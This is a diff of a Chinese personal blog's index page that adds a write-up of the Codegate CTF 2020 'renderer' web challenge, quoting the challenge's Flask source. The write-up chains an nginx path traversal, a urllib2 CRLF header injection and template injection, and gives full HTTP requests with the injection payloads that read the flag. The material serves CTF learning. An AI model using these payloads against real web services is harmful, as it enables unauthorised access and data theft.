@@ -227,7 +227,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">75</span>
+          <span class="site-state-item-count">76</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -240,7 +240,7 @@
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">89</span>
+        <span class="site-state-item-count">92</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -279,6 +279,142 @@
       
 
       
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2020/03/07/Codegate-2020-renderer/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/avatar.jpeg">
+      <meta itemprop="name" content="Tiaonmmn.ZMZ">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Tiaonmmn's Littile House">
+    </span>
+
+    
+    
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/03/07/Codegate-2020-renderer/" class="post-title-link" itemprop="url">Codegate CTF 2020 Preliminary renderer</a>
+        </h2>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2020-03-07 20:17:00" itemprop="dateCreated datePublished" datetime="2020-03-07T20:17:00+08:00">2020-03-07</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">更新于</span>
+        <time title="修改时间：2020-05-18 21:01:30" itemprop="dateModified" datetime="2020-05-18T21:01:30+08:00">2020-05-18</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/Writeups/" itemprop="url" rel="index"><span itemprop="name">Writeups</span></a>
+        </span>
+    </span>
+
+  
+  
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="far fa-comment"></i>
+      </span>
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/03/07/Codegate-2020-renderer/#valine-comments" itemprop="discussionUrl">
+      <span class="post-comments-count valine-comment-count" data-xid="/2020/03/07/Codegate-2020-renderer/" itemprop="commentCount"></span>
+    </a>
+  </span>
+  
+  
+      </div>
+      <div class="post-meta">
+    <span class="post-meta-item" title="本文字数">
+      <span class="post-meta-item-icon">
+        <i class="far fa-file-word"></i>
+      </span>
+      <span class="post-meta-item-text">本文字数：</span>
+      <span>7.7k</span>
+    </span>
+    <span class="post-meta-item" title="阅读时长">
+      <span class="post-meta-item-icon">
+        <i class="far fa-clock"></i>
+      </span>
+      <span class="post-meta-item-text">阅读时长 &asymp;</span>
+      <span>7 分钟</span>
+    </span>
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+          <link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>Codegate CTF 2020的renderer。给了Description:</p>
+<div class="note "><p>It is my first flask project with nginx. Write your own message, and get flag!</p>
+<p>http://XXXXXXX/renderer</p>
+</div>
+<p>同时给了两个附件：</p>
+<figure class="highlight bash"><figcaption><span>settings/run.sh</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">service nginx stop</span><br><span class="line">mv /etc/nginx/sites-enabled/default /tmp/</span><br><span class="line">mv /tmp/nginx-flask.conf /etc/nginx/sites-enabled/flask</span><br><span class="line"></span><br><span class="line">service nginx restart</span><br><span class="line"></span><br><span class="line">uwsgi /home/src/uwsgi.ini &amp;</span><br><span class="line">/bin/bash /home/cleaner.sh &amp;</span><br><span class="line"></span><br><span class="line">/bin/bash</span><br></pre></td></tr></table></figure>
+<figure class="highlight dockerfile"><figcaption><span>Dockerfile</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">2.7</span>.<span class="number">16</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> FLAG CODEGATE2020&#123;**DELETED**&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get update</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt-get install -y nginx</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> pip install flask uwsgi</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> prob_src/src /home/src</span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> settings/nginx-flask.conf /tmp/nginx-flask.conf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> prob_src/static /home/static</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod 777 /home/static</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> mkdir /home/tickets</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod 777 /home/tickets</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> settings/run.sh /home/run.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod +x /home/run.sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> settings/cleaner.sh /home/cleaner.sh</span></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> chmod +x /home/cleaner.sh</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> [<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;/home/run.sh&quot;</span>]</span></span><br></pre></td></tr></table></figure>
+<p>上来注意到的是给的是/renderer，而不是只有一个IP地址。直接访问IP地址后发现是Nginx服务器。那么很容易想到Nginx的不当配置导致<a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/nginx-insecure-configuration.html">路径穿越</a>。打开页面后提示是个Proxy Server，SSRF没跑了。查看网页源代码发现引用了/static/css/renderer.css，那么我们试着访问/static../，果然路径穿越了，这样我们就可以扒下来所有源码了。 <figure class="highlight ini"><figcaption><span>/home/src/uwsgi.ini</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">[uwsgi]</span></span><br><span class="line"><span class="attr">chdir</span> = /home/src/</span><br><span class="line"><span class="attr">module</span> = run</span><br><span class="line"><span class="attr">callable</span> = app</span><br><span class="line"><span class="attr">processes</span> = <span class="number">4</span></span><br><span class="line"><span class="attr">uid</span> = www-data</span><br><span class="line"><span class="attr">gid</span> = www-data</span><br><span class="line"><span class="attr">socket</span> = /tmp/renderer.sock</span><br><span class="line"><span class="attr">chmod-socket</span> = <span class="number">666</span></span><br><span class="line"><span class="attr">vacuum</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">daemonize</span> = /tmp/uwsgi.log</span><br><span class="line"><span class="attr">die-on-term</span> = <span class="literal">true</span></span><br><span class="line"><span class="attr">pidfile</span> = /tmp/renderer.pid</span><br></pre></td></tr></table></figure> <figure class="highlight python"><figcaption><span>/home/src/run.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment">#TODO : disable debug</span></span><br><span class="line">    app.run(debug=<span class="literal">False</span>, host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">8080</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br><span class="line"></span><br></pre></td></tr></table></figure> <figure class="highlight python"><figcaption><span>/home/src/app/routes.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> __future__ <span class="keyword">import</span> print_function</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, render_template_string, request, redirect, abort, Blueprint</span><br><span class="line"><span class="keyword">import</span> urllib2</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> os <span class="keyword">import</span> path</span><br><span class="line"><span class="keyword">from</span> urlparse <span class="keyword">import</span> urlparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">front = Blueprint(<span class="string">&quot;renderer&quot;</span>, __name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@front.before_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;!!!!&#x27;</span>, request.url, file=sys.stderr)</span><br><span class="line"></span><br><span class="line"><span class="meta">@front.route(&quot;/&quot;, methods=[&quot;GET&quot;, &quot;POST&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">    url = request.form.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    res = proxy_read(url) <span class="keyword">if</span> url <span class="keyword">else</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> res:</span><br><span class="line">        abort(<span class="number">400</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>, data = res)</span><br><span class="line"></span><br><span class="line"><span class="meta">@front.route(&quot;/whatismyip&quot;, methods=[&quot;GET&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ipcheck</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;ip.html&quot;</span>, ip = get_ip(), real_ip = get_real_ip())</span><br><span class="line"></span><br><span class="line"><span class="meta">@front.route(&quot;/admin&quot;, methods=[&quot;GET&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_access</span>():</span></span><br><span class="line">    ip = get_ip()</span><br><span class="line">    rip = get_real_ip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;127.0.0.2&quot;</span>]: <span class="comment">#super private ip :)</span></span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ip != rip: <span class="comment">#if use proxy</span></span><br><span class="line">        ticket = write_log(rip)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;admin_remote.html&quot;</span>, ticket = ticket)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">if</span> ip == <span class="string">&quot;127.0.0.2&quot;</span> <span class="keyword">and</span> request.args.get(<span class="string">&quot;body&quot;</span>):</span><br><span class="line">            ticket = write_extend_log(rip, request.args.get(<span class="string">&quot;body&quot;</span>))</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;admin_local.html&quot;</span>, ticket = ticket)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;admin_local.html&quot;</span>, ticket = <span class="literal">None</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@front.route(&quot;/admin/ticket&quot;, methods=[&quot;GET&quot;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">admin_ticket</span>():</span></span><br><span class="line">    print(<span class="string">&#x27;!!!! admin_ticket()&#x27;</span>, file=sys.stderr)</span><br><span class="line">    ip = get_ip()</span><br><span class="line">    rip = get_real_ip()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ip != rip: <span class="comment">#proxy doesn&#x27;t allow to show ticket</span></span><br><span class="line">        print(<span class="string">&#x27;!!!!&#x27;</span>, <span class="number">1</span>, file=sys.stderr)</span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    <span class="keyword">if</span> ip <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&quot;127.0.0.1&quot;</span>, <span class="string">&quot;127.0.0.2&quot;</span>]: <span class="comment">#only local</span></span><br><span class="line">        print(<span class="string">&#x27;!!!!&#x27;</span>, <span class="number">2</span>, file=sys.stderr)</span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    <span class="keyword">if</span> request.headers.get(<span class="string">&quot;User-Agent&quot;</span>) != <span class="string">&quot;AdminBrowser/1.337&quot;</span>:</span><br><span class="line">        print(<span class="string">&#x27;!!!!&#x27;</span>, request.headers.get(<span class="string">&quot;User-Agent&quot;</span>), file=sys.stderr)</span><br><span class="line">        abort(<span class="number">403</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&quot;ticket&quot;</span>):</span><br><span class="line">        log = read_log(request.args.get(<span class="string">&quot;ticket&quot;</span>))</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> log:</span><br><span class="line">            print(<span class="string">&#x27;!!!!&#x27;</span>, <span class="number">4</span>, file=sys.stderr)</span><br><span class="line">            abort(<span class="number">403</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template_string(log)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_ip</span>():</span></span><br><span class="line">    <span class="keyword">return</span> request.remote_addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_real_ip</span>():</span></span><br><span class="line">    <span class="keyword">return</span> request.headers.get(<span class="string">&quot;X-Forwarded-For&quot;</span>) <span class="keyword">or</span> get_ip()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proxy_read</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="comment">#TODO : implement logging</span></span><br><span class="line"></span><br><span class="line">    s = urlparse(url).scheme</span><br><span class="line">    <span class="keyword">if</span> s <span class="keyword">not</span> <span class="keyword">in</span> [<span class="string">&quot;http&quot;</span>, <span class="string">&quot;https&quot;</span>]: <span class="comment">#sjgdmfRk akfRk</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> urllib2.urlopen(url).read()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_log</span>(<span class="params">rip</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;!!!! write_log()&#x27;</span>, file=sys.stderr)</span><br><span class="line">    tid = hashlib.sha1(str(time.time()) + rip).hexdigest()</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&quot;/home/tickets/%s&quot;</span> % tid, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        log_str = <span class="string">&quot;Admin page accessed from %s&quot;</span> % rip</span><br><span class="line">        f.write(log_str)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tid</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_extend_log</span>(<span class="params">rip, body</span>):</span></span><br><span class="line">    tid = hashlib.sha1(str(time.time()) + rip).hexdigest()</span><br><span class="line">    <span class="keyword">with</span> open(<span class="string">&quot;/home/tickets/%s&quot;</span> % tid, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(body)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> tid</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_log</span>(<span class="params">ticket</span>):</span></span><br><span class="line">    print(<span class="string">&#x27;!!!! read_log()&#x27;</span>, file=sys.stderr)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> (ticket <span class="keyword">and</span> ticket.isalnum()):</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> path.exists(<span class="string">&quot;/home/tickets/%s&quot;</span> % ticket):</span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">&quot;/home/tickets/%s&quot;</span> % ticket, <span class="string">&quot;r&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            <span class="keyword">return</span> f.read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure> <figure class="highlight python"><figcaption><span>/home/src/app/__init__.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> app <span class="keyword">import</span> routes</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.url_map.strict_slashes = <span class="literal">False</span></span><br><span class="line">app.register_blueprint(routes.front, url_prefix=<span class="string">&quot;/renderer&quot;</span>)</span><br><span class="line">app.config[<span class="string">&quot;FLAG&quot;</span>] = os.getenv(<span class="string">&quot;FLAG&quot;</span>, <span class="string">&quot;CODEGATE2020&#123;&#125;&quot;</span>)</span><br></pre></td></tr></table></figure> templates就不放了，在我Github上有完整的。</p>
+<p>flag保存在Flask的config里，利用SSRF就可以拿到。那么SSRF在哪？admin_ticket()路由的最后一行render_template_string()很显眼，同时admin_local.html和admin_remote.html里都有一句  
+{% if ticket %}
+  <p class="text-center">
+    Your access log is written with ticket no {{ ticket }}
+  </p>
+{% endif %} 
+ 很明显SSRF了。下一步是怎么触发SSRF。admin_ticket()路由中会用get_ip()和get_real_ip()判断IP来源。get_real_ip()使用X-Forwarded-For头获取IP。没啥问题。</p>
+<p>我们的目标很明显是要通过Proxy Service来访问/admin/ticket，直接在浏览器访问会由于访问IP不为127.0.0.1或127.0.0.2而403。但要成功访问/admin/ticket又需要设置User-Agent为AdminBrowser/1.337。我们可控的是X-Forwarded-For，也就是说我们需要一种方式影响HTTP头。</p>
+<p>研究一下proxy_read()，发现是用的urllib2.urlopen()。搜一下“urllib2 vuln”，返回第一个页面就是<a target="_blank" rel="noopener" href="https://bugs.python.org/issue36276">这个</a>，CRLF Injection。好极了，这个洞可以通过插入。那么，X-Forwarded-For和User-Agent就可以被插入了。</p>
+<p>到现在，题目已经解决，攻击流程如下：</p>
+<ol type="1">
+<li>利用urllib2的漏洞，插入X-Forwarded-For: ，使Proxy Service访问/renderer/admin，生成ticket。</li>
+<li>利用nginx的路径穿越，访问/static../tickets/，获得刚才的ticket文件名。</li>
+<li>利用urllib2的漏洞，插入User-Agent: AdminBrowser/1.337，使Proxy Service访问/renderer/admin/ticket?ticket=刚才的文件名，渲染ticket，读出Flask的config，得到flag。</li>
+</ol>
+<p>OK，Burp发包吧： <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/renderer/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://127.0.0.1/renderer/</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 88</span><br><span class="line"><span class="attribute">Origin</span>: http://127.0.0.1</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: confluence.browse.space.cookie=space-templates</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"></span><br><span class="line">url=http://127.0.0.1/renderer/admin HTTP/1.1%0d%0aX-Forwarded-For: %0d%0aTEST: 123</span><br></pre></td></tr></table></figure> 返回正常页面后访问/static../tickets/，得到文件名：fc75a14b624748a31ddd99ef984df7eaa6781aa9。 然后发包 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/renderer/</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: 127.0.0.1</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:75.0) Gecko/20100101 Firefox/75.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span>: http://127.0.0.1/renderer/</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 214</span><br><span class="line"><span class="attribute">Origin</span>: http://127.0.0.1</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Cookie</span>: confluence.browse.space.cookie=space-templates</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Pragma</span>: no-cache</span><br><span class="line"><span class="attribute">Cache-Control</span>: no-cache</span><br><span class="line"></span><br><span class="line">url=http://127.0.0.1/renderer/admin/ticket?ticket=fc75a14b624748a31ddd99ef984df7eaa6781aa9  HTTP/1.1%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0aUser-Agent:%20AdminBrowser/1.337%0d%0aHost: 127.0.0.1%0d%0a%0d%0aTEST: 123</span><br></pre></td></tr></table></figure></p>
+<p>为什么第二部发包需要两个%0d%0a呢？</p>
+<img src="/2020/03/07/Codegate-2020-renderer/Test0d0a.png" class="">
+<p>GET模式下HTTP头后的任何内容没有意义。我们正常%0d%0a注入后会剩下一个"HTTP/1.1"，这个内容需要处理掉，否则urllib2会报错。因此我们用第二个%0d%0a强行结束HTTP头部分，那么"HTTP/1.1"会被当作HTTP头结束后的内容出现，GET模式下没有意义，会被丢弃，而我们想注入的头已经在前面布置好了。</p>
+
+      
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+  
+  
+  
+
       
   
   
@@ -1352,123 +1488,6 @@ B--&gt;|Prototype|C[&quot;123&quot;]
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://tiaonmmn.github.io/2019/11/25/BUUOJ%E5%88%B7%E9%A2%98-Web-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Buyflag/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/avatar.jpeg">
-      <meta itemprop="name" content="Tiaonmmn.ZMZ">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Tiaonmmn's Littile House">
-    </span>
-
-    
-    
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2019/11/25/BUUOJ%E5%88%B7%E9%A2%98-Web-%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Buyflag/" class="post-title-link" itemprop="url">BUUOJ刷题-Web-极客大挑战2019-Buyflag</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
